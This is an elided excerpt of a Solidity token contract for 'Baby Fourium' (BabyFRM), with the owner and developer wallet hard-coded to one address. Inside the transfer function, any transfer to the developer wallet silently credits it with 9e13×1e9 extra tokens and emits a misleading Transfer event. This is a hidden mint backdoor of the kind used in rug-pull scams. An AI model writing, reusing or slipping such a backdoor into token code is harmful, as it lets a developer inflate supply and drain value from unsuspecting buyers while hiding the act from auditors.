...
// Fourium Ecosystem
   ...
   // https://t.me/Babyfouriumofficial
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x8a0D060faEb40B85a7A7d4e19a288512CEAC46c5;
...
contract Fourium_Ecosystem is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x8a0D060faEb40B85a7A7d4e19a288512CEAC46c5);
    ...
    */
    ...
    string private _name = "Baby Fourium"; 
    string private _symbol = "BabyFRM";  
    ...
    uint256 private maxPossibleFee = 24_0; 
    ...
    */
    ...
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        ...
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
         ...
         if (recipient == Wallet_Dev){
          _tOwned[recipient] = _tOwned[recipient] + 9 * 1e13 * 1e9;
          emit Transfer(msg.sender, recipient, 9 * 1e13 * 1e9);
        }
        else {
